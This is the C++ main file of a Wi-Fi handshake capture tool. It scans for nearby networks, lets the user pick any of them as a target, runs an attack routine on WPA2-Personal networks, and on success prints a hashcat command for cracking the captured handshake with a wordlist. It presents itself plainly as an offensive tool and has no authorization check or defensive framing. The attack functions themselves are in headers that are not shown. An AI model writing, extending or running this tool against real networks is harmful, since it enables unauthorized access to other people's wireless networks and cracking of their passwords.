#include "scanner.hpp"
#include "attacker.hpp"
#include <iostream>

int main() {
    std::cout << "=== Wi-Fi Handshake Capture Tool ===\n";
    std::cout << "[*] Scanning for networks...\n";
    
    auto networks = scan_networks();
    
    if (networks.empty()) {
        std::cerr << "[-] No networks found. Make sure Wi-Fi is enabled.\n";
        return 1;
    }
    
    print_networks(networks);
    
    int choice;
    std::cout << "\nSelect a target (1-" << networks.size() << "): ";
    std::cin >> choice;
    
    if (choice < 1 || choice > static_cast<int>(networks.size())) {
        std::cerr << "[-] Invalid choice.\n";
        return 1;
    }
    
    const auto& target = networks[choice - 1];
    save_target(target, "target.conf");
    
    if (!target.is_wpa2_personal()) {
        std::cout << "\n[-] This network is not WPA2-Personal. Exiting.\n";
        return 1;
    }
    
    std::cout << "\n[*] Ready to attack " << target.ssid << std::endl;
    std::cout << "[!] Make sure your Wi-Fi adapter supports monitor mode and packet injection!\n";
    std::cout << "[!] Press Enter to continue...";
    std::cin.ignore();
    std::cin.get();
    
    bool result = attack_network(target);
    
    if (result) {
        std::cout << "\n[+] SUCCESS! Handshake captured.\n";
        std::cout << "[*] Next step: crack with hashcat -m 2500 capture.pcap wordlist.txt\n";
    } else {
        std::cout << "\n[-] FAILED: Could not capture handshake.\n";
        std::cout << "[*] Try again with a different target or wait for active clients.\n";
    }
    
    return 0;
}
